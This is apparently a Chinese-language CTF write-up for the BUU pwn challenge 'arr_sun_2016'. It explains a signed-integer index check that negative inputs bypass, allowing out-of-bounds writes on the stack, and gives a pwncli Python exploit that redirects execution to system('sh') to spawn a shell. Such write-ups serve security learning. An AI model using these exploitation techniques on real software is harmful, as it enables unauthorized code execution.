---
title: arr_sun_2016
date: 2022-12-10 13:33:51
tags: [CTF, BUU, PWN, WP]
categories: 
    - CTF
    - BUU
    - Pwn
comment: true
---

# 分析
![](1.png)
- 没开PIE和RELRO

![](2.png)
- 有system函数

![](3.png)
- v1为int，输入负数绕过对v1的检测，v5[v1]时将v1当成unsigned int用，因此可以修改v5后任意地址的值

![](4.png)
- 返回地址下面有一个栈地址，可以当作sh的指针

# 思路

- 修改返回地址为ret，再call system，目的是越过返回地址和栈地址中间的那个栈帧
- 修改栈地址为sh，距离返回地址的偏移为0x24

# Exp
``` Python
#!/usr/bin/env python3
# Date: 2022-12-03 19:43:34
# Link: https://github.com/RoderickChan/pwncli
# Usage:
#     Debug : python3 exp.py debug elf-file-path -t -b malloc
#     Remote: python3 exp.py remote elf-file-path ip:port

from pwncli import *
cli_script()


io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

rl()
sl("asd")
for i in range(7):
    rl()
    sl(str(i))
    rl()
    sl(str(500))

rl()
sl("-2147483635")
rl()
sl("134514065")
rl()
sl("-2147483634")
rl()
sl("134514055")
rl()
sl("-2147483626")
rl()
sl("26739")
ia()
```

![](5.png)
